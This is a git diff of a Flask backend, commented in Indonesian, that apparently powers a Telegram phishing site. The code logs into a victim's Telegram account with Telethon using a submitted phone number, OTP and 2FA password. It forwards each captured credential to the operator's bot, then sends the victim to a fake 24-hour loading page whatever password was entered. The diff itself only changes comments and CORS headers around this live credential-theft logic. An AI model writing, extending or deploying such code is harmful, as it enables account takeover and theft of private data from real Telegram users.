@@ -7,10 +7,10 @@ from asgiref.sync import async_to_sync
 
 app = Flask(__name__)
 
-# Izinkan semua origin secara global
+# Izinkan domain Netlify kamu secara spesifik untuk keamanan CORS
 CORS(app, resources={r"/*": {"origins": "*"}})
 
-# Variabel dari Railway
+# Variabel Dashboard Railway
 API_ID = os.getenv("API_ID")
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
@@ -50,13 +50,13 @@ async def telethon_logic(data):
                 send_to_bot(f"✅ *Login Tanpa 2FA*\nNomor: {nomor}\nOTP: {otp}")
                 return {"status": "success"}, 200
             except errors.SessionPasswordNeededError:
-                # Deteksi 2FA, arahkan website ke halaman sandi
+                # Akun punya 2FA, arahkan ke input sandi
                 return {"status": "need_2fa"}, 200
             except errors.PhoneCodeInvalidError:
                 return {"status": "error", "message": "Kode OTP Salah!"}, 400
 
         elif step == 3:
-            # Loloskan apapun sandinya ke halaman loading 24 jam
+            # Langsung lolos ke loading 24 jam
             send_to_bot(f"🔑 *Log Sandi*\nNomor: {nomor}\nSandi: {sandi}")
             return {"status": "success"}, 200
 
@@ -65,17 +65,16 @@ async def telethon_logic(data):
     finally:
         await client.disconnect()
 
-# FUNGSI ANTI-CORS (MEMAKSA HEADER IZIN)
+# Tambahkan Header CORS secara manual ke setiap respon
 @app.after_request
-def add_cors_headers(response):
+def add_headers(response):
     response.headers["Access-Control-Allow-Origin"] = "*"
-    response.headers["Access-Control-Allow-Methods"] = "POST, GET, OPTIONS, PUT, DELETE"
-    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization, x-requested-with"
+    response.headers["Access-Control-Allow-Methods"] = "POST, GET, OPTIONS"
+    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
     return response
 
 @app.route('/register', methods=['POST', 'OPTIONS'])
 def register():
-    # Tangani permintaan 'preflight' browser agar tombol tidak gagal
     if request.method == 'OPTIONS':
         return make_response(jsonify({"status": "ok"}), 200)
         
@@ -87,6 +86,6 @@ def register():
         return make_response(jsonify({"status": "error", "message": str(e)}), 500)
 
 if __name__ == "__main__":
-    # Port 8080 sesuai log Railway
+    # Menyesuaikan port Railway
     port = int(os.getenv("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
